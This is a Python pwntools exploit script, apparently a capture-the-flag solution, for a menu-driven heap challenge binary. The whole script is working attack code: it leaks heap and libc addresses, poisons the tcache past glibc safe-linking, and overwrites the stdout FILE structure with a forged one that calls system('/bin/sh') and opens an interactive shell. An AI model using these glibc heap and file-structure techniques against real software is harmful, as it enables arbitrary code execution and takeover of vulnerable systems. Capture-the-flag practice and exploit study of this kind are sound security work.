#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


@trace
def create(idx, sz, data):
    sla(b"> ", f"1 {idx} {sz}".encode())
    sa(b"Data: ", data)

@trace
def free(idx):
    sla(b"> ", f"2 {idx}".encode())

@trace
def view(idx):
    sla(b"> ", f"3 {idx}".encode())


create(0, 0x10, b"A")
create(1, 0x10, b"A")
free(1)
free(0)
create(0, 0, flat(
    b"A"*0x20
))
view(0)

r(0x20) # skip As
heap_leak = rl().strip()
heap_leak = u64(heap_leak.ljust(8, b"\x00"))
success(f"heap_leak: {heap_leak:#x}")
heap_base = heap_leak << 12
success(f"heap_base: {heap_base:#x}")
free(0)


for size in range(0x60, 0xe0, 0x10):
    create(1, size, b"A" if size != 0xd0 else flat({
        144: 0,
        144+8: 0x21,
        144+0x20: 0,
        144+0x28: 0x21,
    }))
    free(1)

create(1, 0x60, b"A")

create(0, 0, flat(
    b'Z'*0x18,
    0x21,
    b'Z'*0x18,
    0x501,
))

free(1)

create(1, 0, b'D'*0x20)
view(1)

r(0x20) # skip Ds
libc_leak = rl().strip()
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
success(f"libc_leak: {libc_leak:#x}")
libc_base = libc_leak - 0x21ace0
success(f"libc_base: {libc_base:#x}")
free(1)
free(0)
create(0, 0, flat(
    b'Z'*0x18,
    0x21,
    b'Z'*0x18,
    0x501,
))
free(0)

# steal tcache ptr
create(0, 0xf0, b"TTTTTT")
create(1, 0xf0, b"NNNNNN")
free(1)
free(0)

libc = exe.libc
libc.address = libc_base
libc_stdout = libc.symbols['_IO_2_1_stdout_']
info(f"libc_stdout: {libc_stdout:#x}")

create(0, 0, flat(
    b'X'*0x40,
    # safe_link(heap_base + 0x2e0, libc_stdout),
    safe_link(heap_base + 0x2e0, libc_stdout),
))
free(0)
create(0, 0xf0, b"C"*0x20)


# some constants
stdout_lock = libc.address + 0x21a9a0   # _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

# 0x00169fe7: add rdi, 0x10; jmp rcx;
gadget = libc.address + 0x00169fe7 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']            # the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200          # _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

# write the fake Filestructure to stdout
create(1, 0xf0, flat(
    bytes(fake),
))

ia()

# lactf{omg_arb_overflow_is_so_powerful}

